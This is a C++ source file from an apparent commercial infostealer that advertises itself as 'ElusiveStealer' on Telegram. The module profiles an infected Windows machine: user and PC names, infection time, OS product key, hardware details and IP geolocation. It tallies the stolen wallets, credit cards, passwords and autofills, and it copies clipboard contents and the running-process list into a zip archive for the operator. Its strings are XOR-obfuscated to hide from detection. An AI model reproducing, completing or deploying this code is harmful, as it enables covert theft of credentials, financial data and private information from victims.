#include "system_data.h"

#include "../../winapi/winapi.h"
#include "../../utilities/tools/tools.h"
#include "../../utilities/globals/globals.h"
#include "../../utilities/xor/xor.h"
#include "../../utilities/zip_handle/zip_handle.h"
#include "../geolocation/geolocation.h"

#include <intrin.h>

system_data g_system_data;

static int cpu_usage_now() {
	FILETIME a0, a1, a2, b0, b1, b2;

	g_winapi.GetSystemTimes(&a0, &a1, &a2);
	g_winapi.SleepEx(250, FALSE);
	g_winapi.GetSystemTimes(&b0, &b1, &b2);

	static auto from_file_time = [](const FILETIME& ft) {
		ULARGE_INTEGER uli = { 0 };
		uli.LowPart = ft.dwLowDateTime;
		uli.HighPart = ft.dwHighDateTime;
		return uli.QuadPart;
	};

	uint64_t idle0 = from_file_time(a0);
	uint64_t idle1 = from_file_time(b0);
	uint64_t kernel0 = from_file_time(a1);
	uint64_t kernel1 = from_file_time(b1);
	uint64_t user0 = from_file_time(a2);
	uint64_t user1 = from_file_time(b2);

	uint64_t idl = idle1 - idle0;
	uint64_t ker = kernel1 - kernel0;
	uint64_t usr = user1 - user0;

	uint64_t cpu = (ker + usr) * 100 / (ker + usr + idl);

	return static_cast<int>(cpu);
}

static void get_desktop_resolution(int& horizontal, int& vertical) {
	RECT rect;

	const HWND desk = g_winapi.GetDesktopWindow();

	g_winapi.GetWindowRect(desk, &rect);

	horizontal = rect.right;
	vertical = rect.bottom;
}

void system_data::run()
{
	get_info_about_user();

	get_clipboard_data();
	get_process_list();
}

void system_data::get_info_about_user() {

	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);
	g_winapi.GlobalMemoryStatusEx(&statex);

	int cpu_info[4] = { -1 };
	unsigned exid, i = 0;
	char cpu_brand_string[0x40];

	__cpuid(cpu_info, 0x80000000);
	exid = cpu_info[0];

	for (i = 0x80000000; i <= exid; ++i)
	{
		__cpuid(cpu_info, i);

		if (i == 0x80000002)
			memcpy(cpu_brand_string, cpu_info, sizeof(cpu_info));
		else if (i == 0x80000003)
			memcpy(cpu_brand_string + 16, cpu_info, sizeof(cpu_info));
		else if (i == 0x80000004)
			memcpy(cpu_brand_string + 32, cpu_info, sizeof(cpu_info));
	}

	SYSTEM_INFO sys_info;
	g_winapi.GetSystemInfo(&sys_info);

	DISPLAY_DEVICE dd = { sizeof(dd), 0 };
	BOOL ddet = g_winapi.EnumDisplayDevicesA(0, i, &dd, 0x00000001);

	int h, v;
	get_desktop_resolution(h, v);

	TCHAR os_locale[80];
	g_winapi.GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SENGLANGUAGE,
		os_locale, 80 * sizeof(TCHAR));

	const char banner[] =
	{
		0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F,
		0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x5F,
		0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
		0x0D, 0x0A, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x2F, 0x5F, 0x5F,
		0x20, 0x20, 0x2F, 0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F,
		0x5F, 0x5F, 0x5F, 0x28, 0x5F, 0x29, 0x5F, 0x5F, 0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F,
		0x5F, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x5F, 0x5F, 0x20, 0x20, 0x5F, 0x5F, 0x2F, 0x20, 0x20, 0x5F,
		0x5F, 0x20, 0x20, 0x2F, 0x5F, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x20, 0x2F, 0x5F, 0x20, 0x20, 0x5F,
		0x5F, 0x5F, 0x2F, 0x5F, 0x20, 0x20, 0x2F, 0x5F, 0x5F, 0x20, 0x7C, 0x20, 0x2F, 0x20, 0x2F, 0x20,
		0x20, 0x5F, 0x20, 0x5C, 0x0D, 0x0A, 0x20, 0x20, 0x5F, 0x20, 0x20, 0x2F, 0x5F, 0x5F, 0x5F, 0x20,
		0x20, 0x5F, 0x20, 0x20, 0x2F, 0x20, 0x2F, 0x20, 0x2F, 0x5F, 0x2F, 0x20, 0x2F, 0x5F, 0x28, 0x5F,
		0x5F, 0x20, 0x20, 0x29, 0x5F, 0x20, 0x20, 0x2F, 0x20, 0x5F, 0x5F, 0x20, 0x7C, 0x2F, 0x20, 0x2F,
		0x2F, 0x20, 0x20, 0x5F, 0x5F, 0x2F, 0x0D, 0x0A, 0x20, 0x20, 0x2F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F,
		0x2F, 0x20, 0x20, 0x2F, 0x5F, 0x2F, 0x20, 0x20, 0x5C, 0x5F, 0x5F, 0x5F, 0x5F, 0x2F, 0x20, 0x2F,
		0x5F, 0x5F, 0x5F, 0x5F, 0x2F, 0x20, 0x2F, 0x5F, 0x2F, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F,
		0x2F, 0x20, 0x5C, 0x5F, 0x5F, 0x5F, 0x2F
	};

	std::stringstream data;

	data << XOR_STRING("\r\n");
	for (size_t i = 0; i < sizeof(banner) / sizeof(banner[0]); ++i) {
		data << banner[i];
	}
	data << XOR_STRING("\r\n");
	data << XOR_STRING("\r\n");

	data << std::string(2, ' ') << XOR_STRING("| Telegram channel - ") << XOR_STRING("t.me/ElusiveStealer") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Telegram support - ") << XOR_STRING("t.me/ElusiveSupport") << XOR_STRING("\r\n");
	data << XOR_STRING("\r\n");

	data << std::string(2, ' ') << XOR_STRING("<!> We don't have other Telegram supports / channels") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("<!> Always check @USERNAME on correct") << XOR_STRING("\r\n");

	data << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("User") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("-------------------------------------------------------------") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Username - ") << g_tools.get_user_name().c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| PC name - ") << g_tools.get_computer_name().c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Time of infected - ") << g_tools.get_date_time_string().c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Installed path - ") << g_tools.get_program_dir().c_str() << XOR_STRING("\r\n");

	data << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("Quantity found") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("-------------------------------------------------------------") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Wallets found - ") << g_globals.wallets_count << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Apps / Gaming found - ") << g_globals.apps_count << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Utilities found - ") << g_globals.utilities_count << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Credit cards found - ") << g_globals.credit_cards_count << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Passwords found - ") << g_globals.passwords_count << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Autofills found - ") << g_globals.autofill_count << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Downloads found - ") << g_globals.downloads_count << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| History found - ") << g_globals.history_count << XOR_STRING("\r\n");

	data << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("Geolocation") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("-------------------------------------------------------------") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| IP - ") << g_geolocation.m_ip << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Country - ") << g_geolocation.m_country << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Country flag - ") << g_geolocation.m_country_flag << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Country phone - ") << g_geolocation.m_country_phone << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Country capital - ") << g_geolocation.m_country_capital << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Country code - ") << g_geolocation.m_country_code << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Continent code - ") << g_geolocation.m_continent_code << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Region - ") << g_geolocation.m_region << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Org - ") << g_geolocation.m_org << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| ISP - ") << g_geolocation.m_isp << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Timezone - ") << g_geolocation.m_time_zone << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Timezone name - ") << g_geolocation.m_time_zone_name << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Timezone gmt - ") << g_geolocation.m_time_zone_gmt << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Latitude - ") << g_geolocation.m_latitude << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Longitude - ") << g_geolocation.m_longitude << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Currency - ") << g_geolocation.m_currency << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Currency code - ") << g_geolocation.m_currency_code << XOR_STRING("\r\n");

	data << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("System") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("-------------------------------------------------------------") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| OS name - ") << g_tools.get_os_name().c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| OS version - ") <<
		g_tools.get_regedit_info(HKEY_LOCAL_MACHINE, XOR_STRING("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), XOR_STRING("BuildLab")).c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| OS build number - ") <<
		g_tools.get_regedit_info(HKEY_LOCAL_MACHINE, XOR_STRING("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), XOR_STRING("CurrentBuild")).c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| OS language - ") << (const char*)os_locale << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| OS product key - ") <<
		g_tools.get_regedit_info(HKEY_LOCAL_MACHINE, XOR_STRING("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), XOR_STRING("ProductId")).c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| OS bios vendor - ") <<
		g_tools.get_regedit_info(HKEY_LOCAL_MACHINE, XOR_STRING("SYSTEM\\HardwareConfig\\Current"), XOR_STRING("BIOSVendor")).c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| OS bios version - ") <<
		g_tools.get_regedit_info(HKEY_LOCAL_MACHINE, XOR_STRING("SYSTEM\\HardwareConfig\\Current"), XOR_STRING("SystemBiosVersion")).c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| OS bios release date - ") <<
		g_tools.get_regedit_info(HKEY_LOCAL_MACHINE, XOR_STRING("HARDWARE\\DESCRIPTION\\System\\BIOS"), XOR_STRING("BIOSReleaseDate")).c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| CPU name - ") << cpu_brand_string << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| CPU processors - ") << sys_info.dwNumberOfProcessors << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| CPU usage - ") << std::to_string(cpu_usage_now()) << XOR_STRING("%") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Battery - ") << g_tools.get_battery_info().c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| RAM - ") << (statex.ullTotalPhys / 1024) / 1024 << XOR_STRING("mb") << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| HWID - ") << g_tools.get_hwid().c_str() << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Screen Resolution - ") << std::to_string(h) << XOR_STRING("x") << std::to_string(v) << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| Videocard - ") << (ddet ? dd.DeviceString : XOR_STRING("Unknown / Integrated")) << XOR_STRING("\r\n");

	data << XOR_STRING("\r\n");
	data << std::string(2, ' ') << XOR_STRING("| ") << XOR_STRING(WATERMARK) << XOR_STRING("\r\n");

	g_zip.write_zip(g_tools.instruction_file.c_str(), data.str());
}

void system_data::get_clipboard_data() {

	g_winapi.OpenClipboard(nullptr);

	HANDLE data = g_winapi.GetClipboardData(CF_TEXT);

	if (data) {
		char* str = static_cast<char*>(g_winapi.GlobalLock(data));

		g_zip.write_zip(g_tools.clipboard_file.c_str(), str);

		g_winapi.GlobalUnlock(data);
		g_winapi.CloseHandle(data);
	}

	g_winapi.CloseClipboard();
}

void system_data::get_process_list() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = g_winapi.CreateToolhelp32Snapshot(0x00000002, 0);

	std::stringstream ss;

	if (g_winapi.Process32First(snapshot, &entry) == 1)
	{
		const char banner[] = {
				0x0D, 0x0A, 0x20, 0x20, 0x20, 0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
				0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x5F,
				0x20, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x20, 0x20, 0x20, 0x5F, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20,
				0x20, 0x7C, 0x20, 0x5F, 0x20, 0x5C, 0x5F, 0x20, 0x5F, 0x20, 0x5F, 0x5F, 0x5F, 0x20, 0x20, 0x5F,
				0x5F, 0x20, 0x5F, 0x5F, 0x5F, 0x20, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x7C, 0x20, 0x7C, 0x20, 0x20,
				0x28, 0x5F, 0x29, 0x5F, 0x5F, 0x7C, 0x20, 0x7C, 0x5F, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x7C, 0x20,
				0x20, 0x5F, 0x2F, 0x20, 0x27, 0x5F, 0x2F, 0x20, 0x5F, 0x20, 0x5C, 0x2F, 0x20, 0x5F, 0x2F, 0x20,
				0x2D, 0x5F, 0x7C, 0x5F, 0x2D, 0x3C, 0x5F, 0x2D, 0x3C, 0x20, 0x7C, 0x5F, 0x5F, 0x7C, 0x20, 0x28,
				0x5F, 0x2D, 0x3C, 0x20, 0x20, 0x5F, 0x7C, 0x0D, 0x0A, 0x20, 0x20, 0x7C, 0x5F, 0x7C, 0x20, 0x7C,
				0x5F, 0x7C, 0x20, 0x5C, 0x5F, 0x5F, 0x5F, 0x2F, 0x5C, 0x5F, 0x5F, 0x5C, 0x5F, 0x5F, 0x5F, 0x2F,
				0x5F, 0x5F, 0x2F, 0x5F, 0x5F, 0x2F, 0x5F, 0x5F, 0x5F, 0x5F, 0x7C, 0x5F, 0x2F, 0x5F, 0x5F, 0x2F,
				0x5C, 0x5F, 0x5F, 0x7C, 0x0D, 0x0A, 0x0D, 0x0A, 0x20, 0x20, 0x50, 0x49, 0x44, 0x2C, 0x20, 0x50,
				0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x6E, 0x61, 0x6D, 0x65, 0x0D, 0x0A, 0x20, 0x20, 0x2D,
				0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
				0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
				0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
				0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
				0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
				0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
				0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x0D
		};

		for (size_t i = 0; i < sizeof(banner) / sizeof(banner[0]); ++i) {
			ss << banner[i];
		}
		ss << XOR_STRING("\r\n");

		while (g_winapi.Process32Next(snapshot, &entry) == 1)
		{
			ss << std::string(2, ' ') << entry.th32ProcessID << XOR_STRING(", ") << entry.szExeFile << XOR_STRING("\r\n");
			ss << std::string(2, ' ') << XOR_STRING("---------------------------------------------------------------------------------------------------------------") << XOR_STRING("\r\n");
		}
	}

	ss << std::string(2, ' ') << XOR_STRING(WATERMARK) << XOR_STRING("\r\n");

	g_zip.write_zip(g_tools.processlist_file.c_str(), ss.str());

	if (snapshot) {
		g_winapi.CloseHandle(snapshot);
	}
}